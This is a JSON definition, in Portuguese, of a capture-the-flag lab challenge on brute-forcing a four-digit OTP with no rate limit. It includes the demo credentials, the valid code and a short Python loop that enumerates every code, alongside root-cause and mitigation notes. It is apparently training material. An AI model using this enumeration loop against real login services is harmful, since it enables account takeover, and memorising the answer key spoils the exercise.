@@ -1,0 +1,35 @@
+{
+  "slug": "auth-otp-bruteforce",
+  "title": "Quatro dígitos",
+  "codename": "OPERATOR GATE",
+  "summary": "Um login de operador protege um OTP fixo de quatro dígitos sem rate limit, atraso ou lockout. Enumere todo o keyspace e conclua o desafio.",
+  "category": "auth",
+  "difficulty": "easy",
+  "kind": "challenge",
+  "lab_dir": "auth-otp-bruteforce",
+  "estimated_minutes": 16,
+  "xp": 120,
+  "tech": ["Flask", "HTTP Sessions", "OTP"],
+  "tags": ["otp", "brute-force", "authentication", "rate-limiting"],
+  "story": "O console de operador de campo usa um segundo fator para o sign-in. O gateway de demonstração gera um código de quatro dígitos e então aceita tentativas ilimitadas sem atraso. A equipe de operações considera o código de vida curta; a implementação nunca o expira nem o limita de fato.",
+  "objective": "Faça login com as credenciais de operador e então enumere códigos de verificação de quatro dígitos em `/verify` até a flag ser retornada. Envie a flag.",
+  "rules": "Use apenas a conta de operador de demonstração. O gateway é local e intencionalmente não tem rate limiting para este exercício.",
+  "flags": [
+    {"key": "flag", "label": "Flag do console de operador", "flag_type": "user", "points": 120, "required": true}
+  ],
+  "hints": [
+    {"level": 1, "title": "Complete o primeiro passo", "body": "Faça POST de `operator` / `operator123` em `/login`. A resposta inicia um desafio OTP e define um cookie de sessão; `/verify` é o segundo passo.", "cost": 10},
+    {"level": 2, "title": "Observe o formulário de verificação", "body": "O formulário envia um `code` de quatro dígitos para `/verify`. Códigos errados retornam uma página normal de nova tentativa; não há contador de tentativas, atraso ou lockout.", "cost": 15},
+    {"level": 3, "title": "Enumere o keyspace", "body": "Envie `0000`, `0001`, ... como strings de quatro dígitos com zeros à esquerda usando a sessão autenticada. Um código válido retorna a página da flag.", "cost": 20}
+  ],
+  "solution": {
+    "walkthrough": "1. Faça POST em `/login` com `username=operator` e `password=operator123`; guarde o cookie de sessão.\n2. Faça POST em `/verify` com códigos de quatro dígitos, começando em `0000`.\n3. O serviço não tem rate limit nem lockout, então um loop alcança o código válido (`4815`) e retorna a flag.\n\n```python\nimport httpx\nc = httpx.Client(base_url='http://127.0.0.1:PORT')\nc.post('/login', data={'username': 'operator', 'password': 'operator123'})\nfor i in range(10000):\n    r = c.post('/verify', data={'code': f'{i:04d}'})\n    if 'RV{' in r.text:\n        print(f'{i:04d}', r.text)\n        break\n```\n4. Envie a flag da resposta de sucesso.",
+    "root_cause": "O segundo fator é um valor fixo de quatro dígitos com apenas 10.000 possibilidades, e `/verify` não impõe limite de tentativas, atraso, lockout nem expiração. Um atacante que conhece o primeiro fator consegue enumerar todo o keyspace em um loop automatizado curto. Um segundo fator adivinhável proporciona pouca proteção.",
+    "mitigation": "Gere códigos de uso único de alta entropia com expiração curta server-side e imponha limites estritos de tentativas por sessão e por conta, com backoff exponencial e lockout. Vincule o desafio à sessão autenticada, invalide-o após sucesso ou após o limite de falhas, monitore padrões de enumeração e prefira fatores resistentes a phishing, como WebAuthn, para contas privilegiadas."
+  },
+  "references": [
+    {"title": "OWASP Authentication Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html", "source_type": "standard", "description": "Orientação sobre MFA, limites de tentativas e códigos de uso único."},
+    {"title": "PortSwigger — Authentication", "url": "https://portswigger.net/web-security/authentication", "source_type": "official", "description": "Fraquezas de força bruta e de autenticação multifator."},
+    {"title": "CWE-307 — Improper Restriction of Excessive Authentication Attempts", "url": "https://cwe.mitre.org/data/definitions/307.html", "source_type": "standard", "description": "Definição da fraqueza de endpoints de autenticação sem limitação eficaz de tentativas."}
+  ]
+}
